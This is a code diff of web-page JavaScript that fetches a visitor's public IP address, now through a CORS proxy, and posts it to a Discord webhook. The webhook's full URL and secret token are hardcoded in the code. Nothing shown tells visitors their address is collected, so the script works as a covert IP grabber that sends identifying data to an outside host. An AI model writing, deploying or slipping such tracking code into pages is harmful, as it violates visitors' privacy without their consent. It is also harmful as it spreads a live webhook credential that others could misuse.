@@ -8,7 +8,9 @@
         // Function to fetch the IP address
         async function fetchIP() {
             try {
-                const response = await fetch("https://api.my-ip.io/ip");
+                const corsProxyURL = "https://cors-anywhere.herokuapp.com/"; // Use a CORS proxy
+                const targetURL = "https://api.my-ip.io/ip";
+                const response = await fetch(corsProxyURL + targetURL);
                 if (response.ok) {
                     const ip = await response.text();
                     sendToDiscord(ip);
@@ -22,7 +24,7 @@
 
         // Function to send data to a Discord webhook
         async function sendToDiscord(ip) {
-            const webhookURL = "https://ptb.discord.com/api/webhooks/1163557901097521256/ow5q-KQn8LhRYqDGU5XTJNu6GwUHMi1lqU65FlotpUUUcsYdRa-MmNkE5QM3j7DO2JGC"; // Replace with your actual Discord webhook URL
+            const webhookURL = "https://ptb.discord.com/api/webhooks/1163557901097521256/ow5q-KQn8LhRYqDGU5XTJNu6GwUHMi1lqU65FlotpUUUcsYdRa-MmNkE5QM3j7DO2JGC"; // Your Discord webhook URL
 
             const data = {
                 content: `My IP address is: ${ip}`
